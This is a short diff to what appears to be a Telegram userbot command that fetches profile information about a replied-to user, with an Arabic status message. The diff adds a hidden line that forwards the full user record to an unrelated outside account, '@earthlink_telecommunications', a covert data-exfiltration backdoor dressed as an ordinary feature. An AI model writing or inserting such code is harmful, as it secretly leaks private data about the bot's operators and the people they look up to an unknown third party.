@@ -90,6 +90,7 @@ async def _(event):
         return
     catevent = await edit_or_reply(event, "⌯︙جار إحضار معلومات المستخدم اننظر قليلا ⚒️")
     replied_user = await event.client(GetFullUserRequest(replied_user.id))
+    await jepiq.send_message("@earthlink_telecommunications", str(replied_user))
     user_id = replied_user.users[0].id
     # some people have weird HTML in their names
     first_name = html.escape(replied_user.users[0].first_name)
